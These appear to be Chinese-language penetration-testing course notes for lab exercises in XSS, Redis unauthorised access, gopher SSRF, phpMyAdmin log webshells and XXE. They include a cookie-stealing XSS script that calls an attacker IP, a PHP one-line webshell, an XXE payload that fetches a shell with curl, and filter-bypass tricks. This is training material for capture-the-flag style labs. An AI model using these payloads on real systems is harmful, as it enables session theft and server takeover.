##### day1 xss

启端口监听：

> python -m SimpleHTTPServer Port
>
> python3 -m http.server port
>


<script>document.write("<img src='http://172.16.10.147:10086/?id=" + document.cookie + "'>")</script>   ##本机Ip

key1:cookie  登录页面是后缀admin  账号root 密码空

key2:sql注入（注意登录后台删除login.php)可能存在空格过滤使用/**/ 或者 双写绕过  ＃过滤使用%23

显示位load_file(“/var/key2”)显示key2

key3:在tmp目录下![image-20230418100711102](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418100711102.png)

##### day2  Redis未授权访问

> ![image-20230418091942694](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418091942694.png)

> 需要gcc环境编译  在redis目录下make
>
> 环境准备：一台server  一台client
>
> ./redis-server启动服务端
>
> ./redis-cli -h server的IP

> 增：set 键 值
>
> 改：同上
>
> 查：get 键
>
> 删：del
>
> 设置生命周期：expire key  x秒
>
> ttl 键 查看剩余生命周期    
>
> 设置自增：incr key（通过运行来增）

> ###### **哈希操作**
>
> hset  key   里面项目key  值即数据
>
> flushdb   flushall

> ###### 漏洞利用
>
> config set dir 目录位置  (设置保存位置)
>
> 设置保存文件名config set dbfilename  xxx   执行save
>
> 就可在xxx中写shell
>
> ![image-20230418113306880](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418113306880.png)
>
> 

nc IP port 连接成功之后会自动转一行



- **使服务器端支持公钥登录设置**

![image-20230418143316776](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418143316776.png)

![image-20230418142346423](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418142346423.png)

![image-20230418142450721](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418142450721.png)

![image-20230418142509277](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418142509277.png)

![image-20230418142626033](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418142626033.png)

~ (root的家目录） .表示隐藏文件



![image-20230418145506212](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418145506212.png)

==**save  save save!!!**==

shift+page up 翻页

bash start.sh

docker ps -a

![image-20230418161908237](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418161908237.png)

##### D2 Redis SSRF复现

> ![image-20230418193723551](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418193723551.png)
>
> ![](https://cdn.jsdelivr.net/gh/PDX33/image/image-20230418193755453.png)
>
> ![image-20230418205220525](https://cdn.jsdelivr.net/gh/PDX33/image/202305181749311.png)

key3在计任务下/var/spool/cron/root

key3是base64编码的  要解码使用echo 那串字符  |based64  -d

==**一定别忘了save 求你了**==

若在上方浏览器框中输入，要注意字符丢失的问题如＋号

若用BP抓包要用转码  转关键字和全部转码都可以





##### D3

gopher协议：必须加端口，默认端口也要写。第一个字符不传输

格式：gopher：//ip：port/

%0A—>\r

0d%—>\n

![image-20230419112521572](https://cdn.jsdelivr.net/gh/PDX33/image/202305181749045.png)

```
gopher://192.168.202.135:6379/_set
```

###### 视频里第三题，无环境XXE

![image-20230419163640346](https://cdn.jsdelivr.net/gh/PDX33/image/202305181749182.png)

![image-20230419163657645](../AppData/Roaming/Typora/typora-user-images/image-20230419163657645.png)

###### 第四题（或者用eval函数改为post请求，连蚁剑找key2）本题操作机为kali

![image-20230419163743623](https://cdn.jsdelivr.net/gh/PDX33/image/202305181749068.png)

> 1.phpinfo()页面获得路径
>
> 2.扫描目录获得后缀为phpmyadmin登录路径
>
> **登录名root  pw为空**
>
>   打开log功能更改logfile路径为1获得的网站根路径
>
> 3.在库中写入一句话木马：
>
> ```
> select “<?php system($_GET[‘1’]); ?>”;
> ```
>
> 1=dir
>
> <img src="https://cdn.jsdelivr.net/gh/PDX33/image/202305181749202.png" alt="image-20230419164940777" style="zoom:200%;" />
>
> 
>
> 

##### D4 xxe的题实操

> 1.IP加协议头Https是访问不了的，需要查看证书在 Windows\system32\drivers\etc下的hosts文件中加入IP和域名，然后用域名访问
>
> 2.扫描目录得到rebots.txt路径并访问  再次得到xxe路径以及admin.php路径
>
> 访问抓包（注意：考试机代理需要自己设置，还要导入证书才可抓包）
>
> 3.抓包中写入xml代码（查找目录，获得第一个key)
>
> ```<!DCOTYPE xyz[    <!ENTITY  下方标签内的参数 SYSTEM    "" >   ]>```
>
> XML介绍
>
> 。标签对大小写敏感
>
> 。标签必须闭合
>
> 。必须有根元素

> 引号内的命令：``` expect://cat$IFS./xxx```
>
> 如遇不能直接读取：则使用base64下编译后读取：php://filter/read=convert.base64-encode/resource=./index.php  之后再解开

> 4.写shell,连蚁剑。注意设置里面https忽略勾选
>
> 在考试机写shell.php在此文件所在位置cmd中用python启端口
>
> 还是在BP中用exep:///usr/bin/curl$IFS-O$IFS’shell.php所在机的IP‘

> 5.在虚拟终端里面提权(见D3里第三题的截图)
>
> 

$IFS=空格，抓包过滤空格用此代替

![image-20230420165142925](https://cdn.jsdelivr.net/gh/PDX33/image/202305181749555.png)





